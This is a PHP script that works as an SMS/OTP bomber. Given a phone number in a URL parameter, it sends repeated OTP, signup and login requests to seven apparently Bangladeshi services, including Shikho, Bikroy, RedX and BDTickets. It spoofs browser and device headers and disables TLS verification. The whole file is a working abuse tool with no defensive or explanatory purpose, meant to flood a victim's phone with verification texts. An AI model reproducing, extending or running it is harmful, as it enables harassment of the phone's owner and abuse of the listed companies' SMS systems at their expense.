<?php
header('Content-Type: application/json');
set_time_limit(0);

$phone = $_GET['phone'] ?? '';
if(empty($phone)) {
    echo json_encode(["status" => "error", "message" => "Phone number missing"]);
    exit;
}

$phone_11 = (substr($phone, 0, 2) === "88") ? substr($phone, 2) : $phone;
$phone_88 = "88" . $phone_11;
$phone_plus88 = "+88" . $phone_11;

$cookieFile = __DIR__ . '/cookies.txt';

function request($url, $method = 'GET', $data = null, $headers = []) {
    global $cookieFile;
    $ch = curl_init();
    $options = [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_COOKIEJAR => $cookieFile,
        CURLOPT_COOKIEFILE => $cookieFile,
        CURLOPT_CUSTOMREQUEST => $method,
        CURLOPT_HTTPHEADER => array_merge(['User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'], $headers),
        CURLOPT_TIMEOUT => 30,
        CURLOPT_FOLLOWLOCATION => true
    ];
    if ($data) $options[CURLOPT_POSTFIELDS] = json_encode($data);
    
    curl_setopt_array($ch, $options);
    $res = curl_exec($ch);
    curl_close($ch);
    return json_decode($res, true) ?: $res;
}

$responses = [];

for($i=1; $i<=3; $i++){
    // PBS
    $responses["pbs_$i"] = request('https://apialpha.pbs.com.bd/api/OTP/generateOTP', 'POST', ["userPhone" => $phone_11], ['Content-Type: application/json']);
    
    // Shikho
    $responses["shikho_$i"] = request('https://api.shikho.com/auth/v2/send/sms', 'POST', ["phone" => $phone_88, "type" => "student", "auth_type" => "signup", "vendor" => "shikho"], ['Content-Type: application/json']);
    
    // Iqra Live
    $responses["iqra_$i"] = request("https://apibeta.iqra-live.com/api/v2/sent-otp/".$phone_11, 'GET');
    
    // Truck Lagbe
    $responses["truck_lagbe_$i"] = request('https://tethys.trucklagbe.com/tl_gateway/tl_login/128/loginWithPhoneNo', 'POST', ["userType" => "shipper", "phoneNo" => $phone_11], ['Content-Type: application/json', 'deviceId: ' . uniqid(), 'lat: 23.8103', 'lng: 90.4125']);
    
    // BDTickets
    $responses["bdtickets_$i"] = request('https://api.bdtickets.com:20100/v1/auth', 'POST', ["createUserCheck"=>true,"phoneNumber"=>$phone_plus88,"applicationChannel"=>"WEB_APP"], ['Content-Type: application/json']);
    
    // Bikroy
    $responses["bikroy_$i"] = request("https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11", 'GET', null, ['Accept: application/json']);
    
    // RedX
    $responses["redx_$i"] = request('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', 'POST', ["phoneNumber" => $phone_11], ['Content-Type: application/json', 'origin: https://redx.com.bd']);
    
    sleep(2);
}

echo json_encode($responses, JSON_PRETTY_PRINT);
?>
